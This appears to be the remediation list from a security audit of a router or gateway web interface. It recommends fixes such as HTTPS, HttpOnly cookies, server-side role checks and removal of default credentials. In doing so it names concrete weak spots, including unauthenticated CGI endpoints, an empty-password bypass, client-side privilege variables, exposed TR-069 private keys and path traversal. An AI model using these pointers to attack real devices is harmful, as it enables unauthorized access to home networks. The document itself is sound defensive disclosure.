1. **Enable HTTPS** with certificate validation
2. **Replace Base64 password encoding** with proper challenge-response (HMAC)
3. **Remove `CheckPwdNotLogin.asp`** or add strict rate limiting
4. **Add authentication** to `FrameModeSwitch.cgi` and `MdfPwd*NoLg.cgi`
5. **Replace `dealDataWithFun()`** with JSON.parse() for data deserialization
6. **Add `HttpOnly`, `Secure`, and `SameSite`** attributes to session cookies
7. **Implement server-side rate limiting** on login attempts
8. **Remove default credentials** from login page HTML variables
9. **Rotate X_HW_Token** per-request, not per-session
10. **Restrict `getajax.cgi`** to only serve paths needed by the current user role
11. **Move Userlevel to server-side session** — never trust client-side privilege variables
12. **Remove DBAA1 empty-password bypass** — always require password validation
13. **Never embed default credentials** in HTML (ANTEL mode)
14. **Sanitize Language parameter** — whitelist valid language codes
15. **Do not let server control PBKDF2 iterations** — use a fixed minimum (100,000+)
16. **Use textContent instead of innerHTML** — prevent DOM-based XSS
17. **Restrict TR-069 certificate/key paths** — never expose private keys via web API
18. **Encrypt stored credentials** in TR-069 data model
19. **Restrict `setajax.cgi` / write endpoints** — server-side ACL per user role
20. **Validate and whitelist `RequestFile` parameter** — prevent path traversal and open redirects
21. **Remove `hexDecode()` from response chain** — serve JSON directly, parse with `JSON.parse()`
